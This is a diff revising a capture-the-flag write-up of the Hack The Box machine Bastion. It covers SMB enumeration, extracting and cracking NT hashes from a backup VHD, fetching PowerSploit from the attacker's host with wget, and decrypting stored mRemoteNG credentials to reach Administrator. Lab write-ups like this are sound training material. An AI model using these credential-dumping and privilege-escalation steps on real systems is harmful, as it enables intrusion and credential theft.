@@ -12,7 +12,7 @@ IP: 10.10.10.134
 <!--more-->
 
 ## Recon
-
+A qick portscan reveals multiple open ports:  
 ```
 PORT    STATE SERVICE
 22/tcp  open  ssh
@@ -22,8 +22,7 @@ PORT    STATE SERVICE
 ```
 
 ## SMB
-The host has anonymous SMB with disabled message signing, so let's have a look at that.  
-Let's begin with some recon:  
+A closer investigation of the SMB service reveals that it is allowing anonymous access with disabled message signing, which in turn enables public enumeration.  
 `msf5 > use auxiliary/scanner/smb/pipe_auditor`  
 This yields some interesting endpoints: 
 ```
@@ -41,16 +40,15 @@ This yields some interesting endpoints:
 So let's look into the shares.
 First, let's mount the Backups share:  
 `sudo mount -t cifs -o user=guest //10.10.10.134/Backups /mnt/`
-There's a Backup of a full client machine at `WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351`.  
-Could be worth a shot for NTLM hashes :3
+There's a Backup of a full client machine at `WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351` to be discovered.
+
 
 
 ## The Backup
-So copy that VHD (in case someone resets the box while you're snooping around) and mount it with  
+This VHD, copied and then mounted on Linux enabled closer investigation:
 `sudo guestmount -a 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd -i --ro /mnt/guest/`
 
-Next up: dumping the NTHash for the user. That can be done by copying SAM and SYSTEM from `C:\Windows\system32\config\`  
-and then calling pwdump on it:  
+With an unbooted Windows installation like this, it is possible to copy registry hives from `C:\Windows\system32\config\` and dump the NTHash for the users:
 ```
 apalax@raudfjorden:~/writeups/HTB/Labs/Bastion$ pwdump SYSTEM SAM 
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
@@ -58,7 +56,7 @@ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
 
 ```
-The syntax for these hashes is `username:id:LM-Hash:NT-Hash`. Let's try them by throwing these into `hashes.txt` and feeding it to john:  
+The syntax for these hashes is `username:id:LM-Hash:NT-Hash`. These are then copied into `hashes.txt` and handed off to john for a dictionary attack:
 ```
 john --format=nt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
@@ -78,12 +76,11 @@ If we connect via SSH, we're dropped into a CMD (?).
 
 
 ## Road to root
-Basically, I'm following this article: https://www.fuzzysecurity.com/tutorials/16.html    
-We're making use of Matt Graebers excellent tool, Powersploit. 
+A try was to make use of Matt Graebers tool, Powersploit. 
 
-Get PowerSploit
-`wget http://10.10.15.195:8000/PowerSploit-3.0.0.zip -OutFile ps.zip`
-In more detail, PowerUp. So download the Privesc folder into the PS Module path, import the module and fire away!  
+First, Powersploit needs to be downloaded:  
+`wget http://10.10.15.195:8000/PowerSploit-3.0.0.zip -OutFile ps.zip`  
+So download the Privesc folder into the PS Module path, import the module and run:  
 ```
 Import-Module Privesc
 Get-Command -Module Privesc
@@ -98,26 +95,25 @@ Invoke-AllChecks
 HijackablePath : C:\Users\L4mpje\AppData\Local\Microsoft\WindowsApps\                                      
 AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\L4mpje\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll' -Command '...'    
 ```
-Not working?
-
-Poking around shows an SSH config file with this: 
+Which seems to not work. Poking around shows an SSH config file reveals: 
 ```
 Match Group administrators                                                                       
        AuthorizedKeysFile __PROGRAMDATA__/ssh/administrators_authorized_keys 
 ```
-unfortunately, we don't have write access to that folder as user, so keep looking!
+unfortunately, we don't have write access to that folder as user, so another path for privilege escalation is needed.
 
-### Ze RemoteNG?!
-Poking around more reveals mRemoteNG, which seems off. Googling around reveals that it suffers from insecure password storage.  
-So let's grab the connection.xml:
+### mRemoteNG
+A more thorough investigation reveals that mRemoteNG is installed, a remote administration tool.  
+On closer examination it is revealed that this software suffers from insecure password storage issues.  
+The credentials are stored in a `connection.xml`:
 ```
 PS C:\Users\L4mpje\AppData\Roaming\mRemoteNG> type .\confCons.xml
 ```
-We try to decrypt it with [mremoteng-decrypt](https://github.com/haseebT/mRemoteNG-Decrypt).  
+Which can be decrypted with [mremoteng-decrypt](https://github.com/haseebT/mRemoteNG-Decrypt).  
 This is done by providing the decrypter the administrator password hash:  
 ```
 python mremoteng_decrypt.py -s "aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==" 
 Password: thXLHM96BeKL0ER2
 ```
 
-So this is root! Connect, `cd` to Desktop and `type root.txt`. Fun box, but root and Windows enum took me a while.
+This yields the password for the Administrator account. Connect, `cd` to Desktop and print the flag with `type root.txt`.
